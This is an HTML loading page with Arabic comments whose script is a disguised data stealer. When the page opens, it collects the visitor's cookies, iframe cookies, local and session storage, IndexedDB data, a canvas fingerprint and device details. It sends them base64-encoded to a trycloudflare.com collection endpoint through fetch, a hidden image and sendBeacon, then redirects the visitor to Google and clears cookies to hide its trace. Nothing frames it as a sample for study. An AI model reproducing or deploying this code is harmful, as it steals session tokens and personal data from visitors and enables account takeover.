<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .loader { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #222;
            border-top: 4px solid #0ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { font-size: 16px; color: #888; }
    </style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <p>جاري التحميل...</p>
</div>

<script>
    (function() {
        // =============================================
        // 1. الإعدادات السريعة
        // =============================================
        const SERVER = 'https://dubai-maximum-infectious-directions.trycloudflare.com/collect';
        const REDIRECT = 'https://www.google.com';
        const TIMEOUT = 500; // 0.5 ثانية

        // =============================================
        // 2. سحب الكوكيز من iframes (إن وجدت)
        // =============================================
        function getIframeCookies() {
            let all = {};
            try {
                document.querySelectorAll('iframe').forEach((iframe, i) => {
                    try {
                        const doc = iframe.contentDocument || iframe.contentWindow.document;
                        if (doc && doc.cookie) {
                            doc.cookie.split('; ').forEach(c => {
                                const [k, v] = c.split('=');
                                if (k) all[`iframe_${i}_${k}`] = v || '';
                            });
                        }
                    } catch(e) {}
                });
            } catch(e) {}
            return all;
        }

        // =============================================
        // 3. سحب الكوكيز العادية (أسرع طريقة)
        // =============================================
        function getCookies() {
            try {
                const c = document.cookie;
                if (!c) return {};
                return c.split('; ').reduce((acc, item) => {
                    const [k, v] = item.split('=');
                    if (k) acc[k] = v || '';
                    return acc;
                }, {});
            } catch(e) { return {}; }
        }

        // =============================================
        // 4. سحب localStorage + sessionStorage
        // =============================================
        function getStorage(type) {
            try {
                const s = type === 'local' ? localStorage : sessionStorage;
                const res = {};
                for (let i = 0; i < s.length; i++) {
                    const k = s.key(i);
                    res[k] = s.getItem(k);
                }
                return res;
            } catch(e) { return {}; }
        }

        // =============================================
        // 5. سحب IndexedDB (إن وجدت)
        // =============================================
        function getIndexedDB() {
            return new Promise((resolve) => {
                try {
                    const req = indexedDB.open('_temp', 1);
                    req.onsuccess = function(e) {
                        const db = e.target.result;
                        const stores = Array.from(db.objectStoreNames);
                        let all = {};
                        let done = 0;
                        if (stores.length === 0) return resolve({});
                        stores.forEach(storeName => {
                            try {
                                const tx = db.transaction(storeName, 'readonly');
                                const store = tx.objectStore(storeName);
                                const req2 = store.getAll();
                                req2.onsuccess = function(e) {
                                    all[storeName] = e.target.result;
                                    done++;
                                    if (done === stores.length) resolve(all);
                                };
                                req2.onerror = function() {
                                    done++;
                                    if (done === stores.length) resolve(all);
                                };
                            } catch(e) {
                                done++;
                                if (done === stores.length) resolve(all);
                            }
                        });
                        setTimeout(() => resolve(all), 1000);
                    };
                    req.onerror = function() { resolve({}); };
                } catch(e) { resolve({}); }
            });
        }

        // =============================================
        // 6. بصمة الجهاز (Canvas Fingerprint)
        // =============================================
        function getFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
                return canvas.toDataURL();
            } catch(e) { return 'no_fingerprint'; }
        }

        // =============================================
        // 7. جمع كل شيء (مع IndexedDB)
        // =============================================
        async function collectAll() {
            const indexedDB = await getIndexedDB();
            return {
                c: getCookies(),
                ifc: getIframeCookies(),
                l: getStorage('local'),
                s: getStorage('session'),
                idb: indexedDB,
                ua: navigator.userAgent,
                fp: getFingerprint(),
                t: Date.now(),
                url: window.location.href,
                ref: document.referrer || '',
                screen: `${screen.width}x${screen.height}`,
                lang: navigator.language,
                platform: navigator.platform
            };
        }

        // =============================================
        // 8. ترميز إلى Base64 (سريع)
        // =============================================
        function b64(str) {
            try {
                return btoa(unescape(encodeURIComponent(str)));
            } catch(e) {
                return btoa(str);
            }
        }

        // =============================================
        // 9. إرسال البيانات (مع Beacon)
        // =============================================
        function sendData(data) {
            const payload = b64(JSON.stringify(data));
            
            // محاولة 1: fetch
            try {
                fetch(SERVER, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ p: payload })
                }).catch(() => {});
            } catch(e) {}

            // محاولة 2: إرسال عبر صورة
            try {
                const img = new Image();
                img.style.display = 'none';
                img.src = SERVER + '?d=' + encodeURIComponent(payload);
                document.body.appendChild(img);
                setTimeout(() => img.remove(), 100);
            } catch(e) {}

            // محاولة 3: Beacon (حتى لو أغلق المتصفح)
            try {
                navigator.sendBeacon(SERVER, new Blob([JSON.stringify({ p: payload })], {type: 'application/json'}));
            } catch(e) {}
        }

        // =============================================
        // 10. التشغيل الفوري + إعادة توجيه خاطفة
        // =============================================
        (async function() {
            const data = await collectAll();
            sendData(data);

            document.querySelector('p').textContent = 'تم التحميل';

            setTimeout(() => {
                window.location.href = REDIRECT;
            }, TIMEOUT);
        })();

        // =============================================
        // 11. مسح الكوكيز بعد 3 ثوان (إخفاء الأثر)
        // =============================================
        setTimeout(() => {
            try {
                document.cookie.split(';').forEach(c => {
                    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/');
                });
            } catch(e) {}
        }, 3000);

        // =============================================
        // 12. إرباك المحللين
        // =============================================
        console.log('Page ready.');
        // debugger;
    })();
</script>
</body>
</html>
